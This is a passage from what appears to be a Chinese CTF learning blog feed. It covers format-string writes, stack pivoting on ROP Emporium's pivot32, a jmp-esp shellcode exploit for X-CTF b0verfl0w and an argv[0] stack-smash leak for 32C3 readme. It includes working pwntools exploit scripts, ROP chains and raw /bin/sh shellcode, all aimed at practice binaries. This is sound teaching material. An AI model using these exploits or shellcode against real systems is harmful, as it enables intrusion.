class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">prev, word, index</span>):<br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure><p>只需在main函数中调用fmt_str()函数，填充相应变量即可。</p><p>其中每个参数的含义基本如下：</p><ul><li>offset 表示要覆盖的地址最初的偏移</li><li>size 表示机器字长</li><li>addr 表示将要覆盖的地址。</li><li>target 表示我们要覆盖为的目的变量值。</li></ul><p>最终得到exp：（函数构造也要写在exp里的，这里防止啰嗦就不写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn imort *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br><span class="hljs-built_in">print</span> payload<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后结果：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show3.png"></p><hr><p>格式化字符串基础部分over!😎</p><p>格式的Length部分真的是花了我好久才搞明白什么意思，中文网站上都是直译英文，去英文网站用尽毕生英语所学才搞懂😨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不那么菜菜的ROP</title>
    <link href="/2023/07/06/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/07/06/%E4%B8%8D%E9%82%A3%E4%B9%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>栈上的不那么简单小玩意们</p><span id="more"></span><h1 id="Stack-pivoting"><a href="#Stack-pivoting" class="headerlink" title="Stack pivoting"></a>Stack pivoting</h1><p>stack pivoting (堆栈转移)，基本思想是利用已有的内存区域或数据结构（例如堆）来构造一个新的堆栈，然后将程序的控制流转移到该堆栈上执行。通过将堆栈指针 (ESP&#x2F;RSP) 设置为新的堆栈地址，并在该堆栈上构造合适的函数调用帧，可以控制程序的执行路径。</p><p>通常在内存布局受限或某些保护机制存在的情况下使用。</p><p>利用stack pivoting有以下几个特征：</p><ul><li>栈可以控制的空间过小不足以构造完整的rop链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域</li></ul><p>说到底栈迁移就是 <code>&#39;a&#39;*offset+p64(fake_stack)+P64(leave)</code></p><p>首先我们需要了解函数在执行结束后会执行的 <code>leave;ret</code> 这条汇编代码的含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># leave, 相当于执行<br>mov esp, ebp<br>pop ebp<br><br># retn, 相当于执行<br>pop eip<br><br>#执行leave指令后，首先绘将ebp的值赋给esp，然后做一个出栈操作，栈指针会向栈底移动一个地址。此时执行ret，就会跳转到新的栈顶指针的地址，即原ebp+8处存储的地址。<br></code></pre></td></tr></table></figure><p>在实际的程序汇编代码中，我们还需要利用如下图所示的代码：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-08-10_15-57-09.png"></p><p><code>rax, [rbp+buf]</code> 我们要知道这句汇编在干嘛，其实就是把 rbp+buf 的地址给到 rax。我们都知道栈溢出是先溢出到 rbp 再到 rip 的，我们可以通过栈溢出的方式控制 rbp 的值，在下面又将会把 rax 的值赋给 rsi ，通过这条汇编命令我们就可以控制 rbp 和 rsi 。</p><p>像上图的例子，假设我们通过溢出控制了 rbp 为 0x123000，那么 read 命令就相当于在执行 <code>read(0,0x123000+buf,xx)</code> ，也就是读入的数据被写入了 0x123000。至此我们就可以实现任意地址的写入。</p><p>但是这样<strong>只适用于我们只利用一次漏洞的情况</strong>，如果我们多次利用漏洞就需要为程序完整的构造一个栈结构，实现 “ 把栈搬走 ” 。</p><p>大致的通用思路就是：</p><ul><li><p>第一次栈迁移修改 rbp 让接下来的输入指向我们想要写的地方</p></li><li><p>第二次栈迁移修改 rsp 让程序正常</p></li><li><p>第三次栈迁移进行攻击 rop 链的构造（例如泄露 libc ，修改 GOT 地址，在栈上布置 shell rop 链）</p></li><li><p>第四次重复第一次的操作</p></li><li><p>第五次构造 getshell rop 链</p></li></ul><blockquote><p>如果需要进行多次 rop 攻击，除了最后一次都需要重复 1、2 操作恢复栈结构</p></blockquote><h4 id="🌰-1："><a href="#🌰-1：" class="headerlink" title="🌰_1："></a>🌰_1：</h4><p>发现了一个靶场：<a href="https://ropemporium.com/">ROP Emporium</a>，选择pivot-x_86</p><p>给的压缩包里还有一个动态链接库 <code>libpivot32.so</code>，checksec 一下甚至出现了没见过的玩意 <code>RUNPATH:  &#39;.&#39;</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">RUNPATH:</span>  <span class="hljs-string">&#x27;.&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>这个  RUNPATH:  ‘.’  的意思是可执行文件的运行时路径（run-time search path）设置为当前目录（’.’），也就是它运行时会使用题目所给的动态链接库</p></blockquote><p>直接在linux里运行一下看看，这个程序有有两个输入。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-19-28.png"></p><p>反编译一下这个程序的main函数，复制一下源码写个注释</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *ptr; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pivot by ROP Emporium&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;x86\n&quot;</span>);<br>  ptr = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000000</span>u);  <span class="hljs-comment">//分配一个0x1000000u的内存块，并将其地址赋值给ptr指针</span><br>  <span class="hljs-keyword">if</span> ( !ptr )  <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Failed to request space for pivot stack&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;  <span class="hljs-comment">//检查内存分配是否成功，如果失败则输出错误信息并退出程序。</span><br>  <span class="hljs-built_in">pwnme</span>(ptr + <span class="hljs-number">16776960</span>);  <span class="hljs-comment">//调用pwnme函数，将ptr指针偏移16776960字节的位置作为参数传递给它。</span><br>  <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//释放先前分配的内存块</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nExiting&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现main函数里没有什么漏洞可以被我们利用，但是在<code>pwnme</code>函数里发现<code>read()</code>没有输入长度的验证</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-25_20-26-26.png"></p><p>其中在第二个输入溢出时，只有<code>(0x38-0x28-4)</code>即12个字节的缓冲区可以利用，无法直接在栈上构造rop链。题目也有提示，我们需要将rop链存到buf中，再将栈转移到buf上。</p><p>我们发现puts一条文本<code>Call ret2win() from libpivot</code>，没有在这个可执行文件中发现这个函数，但是题目还给了一个动态链接库 <code>libpivot32.so</code>，发现这是一个后门函数，我们可以控制程序跳转到这里执行为我们打开flag。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-26_10-33-31.png"></p><p>需要注意的是程序执行到我们填入的<code>leave;ret</code>指令之前，自己也执行了一次该指令。也就是说这个指令被执行了两次</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-04_15-45-03.png"></p><p>由于每次ret都会使得esp+4，所以，伪造的ebp的地址要减去4。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./pivot32&quot;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pivot32&#x27;</span>)<br>lib_elf=ELF(<span class="hljs-string">&#x27;./libpivot32.so&#x27;</span>)<br><br>func_plt=elf.plt[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>func_got_plt=elf.got[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>foothold_sym=lib_elf.symbols[<span class="hljs-string">&#x27;foothold_function&#x27;</span>]<br>ret2win_sym=lib_elf.symbols[<span class="hljs-string">&#x27;ret2win&#x27;</span>]<br>offset=<span class="hljs-built_in">int</span>(ret2win_sym-foothold_sym)<br><br>leave_ret=<span class="hljs-number">0x080486a8</span><br>mov_eax_eax=<span class="hljs-number">0x080488c4</span><br>pop_eax=<span class="hljs-number">0x080488c0</span><br>pop_ebx=<span class="hljs-number">0x08048571</span><br>add_eax_ebx=<span class="hljs-number">0x080488c7</span><br>call_eax=<span class="hljs-number">0x080486a3</span><br><br>p.recvuntil(<span class="hljs-string">&quot;The Old Gods kindly bestow upon you a place to pivot: &quot;</span>)<br>fake_ebp=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br><br>payload1=p32(func_plt)+p32(pop_eax)+p32(func_got_plt)+p32(mov_eax_eax)+p32(pop_ebx)+p32(offset)+p32(add_eax_ebx)+p32(call_eax)<br><br><span class="hljs-comment">#这里需要先调用一次foothold_function，将它的地址加载到got.plt中，我们才能进行后续的替换</span><br><span class="hljs-comment">#payload含义为，将eax赋值为foothold_function的真实地址，再将ebx赋值为foothold_function和ret2win的偏移，最后将ebx加到eax上，调用ret2win</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload1)<br><br>payload2=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">40</span>+p32(fake_ebp-<span class="hljs-number">4</span>)+p32(leave_ret)<br><br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(payload2)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="🌰-2"><a href="#🌰-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p> [X-CTF Quals 2016 - b0verfl0w](<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w) </p><p>题目拿到手先查看一下基本信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-27-21.png"></p><p>查看一下源码发现vul函数有栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-39-53.png"></p><p>但是可控制的范围很小只有50-32-4&#x3D;14个字节，我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置 shellcode 并执行。</p><p>构造完shellcode之后，我们需要对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p><p>查找一下可以利用的gadget</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_10-46-47.png"></p><p>其中<code>0x08048504</code>有直接跳转到esp的片段，</p><p>修改栈上的返回地址为<code>jmp esp</code>的地址，这样程序就会跳转到栈顶指针所指向的地址处执行payload。</p><p>构造结构如下：</p><p>shellcode+padding&#x3D;0x20，fake ebp&#x3D;0x4，jmp_esp&#x3D;0x4</p><p>为了保证栈上有足够的空间执行payload，我们能将栈指针向下调整，即sub esp, 0x28;jmp esp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./b0verfl0w&#x27;</span>)<br><br>jum_esp=<span class="hljs-number">0x08048504</span><br><br>Shellcode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br>Payload=Shellcode+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">13</span>+p32(jum_esp)+asm(<span class="hljs-string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)<br><br><span class="hljs-comment">#先利用sub esp, 0x28;jmp esp指令跳转到调整后的栈顶，再向上面写入shellcode，最后再次执行jum_esp跳转执行shellcode  </span><br><br>r.sendline(Payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><p>canary保护有多种绕过方式，其中Stack smash就是绕过canary保护的一种方式。之前做过的canary保护绕过是填充canary最后的字节并之后暴力枚举或是直接泄露，从而避免canary保护程序报错。Stack smash这个方法并不在乎是否会引发canary报错，而是利用报错的内容。</p><p>在程序启动canary保护之后，如果发现canary被修改的话就会执行 <code>_stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下这个指针指向程序名。如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串地址，那么在 <code>_fortify_fail</code> 函数中就会输出我们想要的信息。</p><blockquote><p>这个方法适用于glibc-2.31以前的程序，之后的程序不会打印 argv[0] 指针所指向的字符串</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>以2015年32C3 CTF readme 为例</p><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200">2015 32C3 CTF readme</a></p><p>触发canary保护后程序会输出一段报错  </p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_16-51-08.png"></p><p>开始解题，反汇编一下源码。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-14-00.png"></p><p>程序中有两次输入，第一次输入赋值给v3后不对其进行任何操作；第二次输入赋值给v1，将其不断赋值给byte_600D20这个数组。</p><p>双击查看数组</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-16-59.png"></p><p>也就是说这道题我们只需要拿flag而不是拿shell，而且v2变量接收第二次输入的字符串，并且会不断覆盖原有的flag内容。</p><p>在这之后还有一条语句</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)((<span class="hljs-type">int</span>)v0 + <span class="hljs-number">6294816LL</span>), <span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">32</span> - v0));<br></code></pre></td></tr></table></figure><p> 这条伪代码的原型是这样的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">int</span> value, <span class="hljs-type">size_t</span> num)</span></span>;<br></code></pre></td></tr></table></figure><p>意思是从内存指针ptr指向的位置直到向后num字节都被value取代。</p><p>结合 <code>byte_600D20[v0++] = v1;</code> ，我们题目中的函数意思就是无论你是否进行第二次输入，在程序结束后 flag 的位置都将被替换，我们就无法通过直接修改 argv[0] 的值获得 flag 。</p><p>但是flag被映射了两次，0x600D21中的flag被修改，那我们就把 argv[0] 指向 0x400d21。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_16-02-26.png"></p><blockquote><p>看了很多大佬的解析也没搞明白，程序中有两个load段，为什么第二个load段中的flag，会被映射到第一个load 段里🥲</p></blockquote><p>查找argv[0]的位置，一共找到三种方法：</p><ul><li>方法一：</li></ul><p>用peda挂载文件，先在第一个gets处下断点</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-37-25.png"></p><p>利用find命令查找与文件名有关的地址，再计算当前的rsp指针与其的距离</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-42-28.png"></p><ul><li>方法二</li></ul><p>也是利用argv[0]指向程序名的特点寻找，直接下断点，查找指向程序名的内存指针。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-46-20.png"></p><ul><li>方法三</li></ul><p>用命令<code>p &amp; __libc_argv[0]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gdb">&gt; p &amp; __libc_argv[0]<br>$1 = (char **) 0x7fffffffdff8<br></code></pre></td></tr></table></figure><p>我们要写入536个字节也就是0x218个字节才能将argv[0]覆盖掉，所以payload构成应该是0x218字节的填充物加上我们目标flag的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span>+p64(<span class="hljs-number">0x400d20</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Please overwrite the flag:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;Modifier&#x27;</span>)<br><br><span class="hljs-built_in">print</span> p.recv()<br></code></pre></td></tr></table></figure><p>但是没有输出，是因为程序把错误信号发送给了执行程序的终端里，我们需要修改环境变量让错误信息通过网络传到我们的终端里。</p><p>所以我们要利用第二次的输入，将 <code>LIBC_FATAL_STDERR_=1</code> 写入到环境变量中。在第一个payload当中我们已经把指针指向了argv[0]，需要将指针再次指向第二次输入点，结果如下：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)</span><br><br><span class="hljs-variable">payload_1</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x218</span> + <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x400d20</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x600d20</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_1</span>)<br><br><span class="hljs-variable">payload_2</span> = <span class="hljs-string">&quot;LIBC_FATAL_STDERR_=1&quot;</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_2</span>)<br><br><span class="hljs-variable">print</span> <span class="hljs-variable">p.recvall</span>()<br></code></pre></td></tr></table></figure><hr><p>原来栈溢出不是想象中的辣么简单捏</p><p>栈上的东西终于整理好噜😊</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>真的很菜菜的ROP</title>
    <link href="/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>栈上的简单小玩意们</p><span id="more"></span><hr><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming，面向返回编程），其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>实施ROP的条件</strong></p><ul><li>程序存在栈溢出，且可以控制返回地址</li><li>可以找到满足程序的 gadgets 以及相应的 gadgets 的地址</li></ul><blockquote><p>都是copy来的）看到有的人说这个叫“面向返回地址”编程哈哈。</p></blockquote><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码(.text)，比如<code>system(&quot;/bin/sh&quot;)</code>或者<code>system(&quot;cat flag&quot;)</code>。我们需要做的就是把这些代码段的调用地址覆盖到返回地址上。</p><p>我们在控制程序执行的时候也可以控制程序执行好几段不相邻的已有代码，这是我们需要知道对应返回的代码的位置。程序如果开启了某些保护，我们就需要想办法去绕过它。</p><h4 id="🌰-1"><a href="#🌰-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-14-08.png"></p><p>使用ida反编译main函数，发现gets()语句，可以利用栈溢出</p><p><img 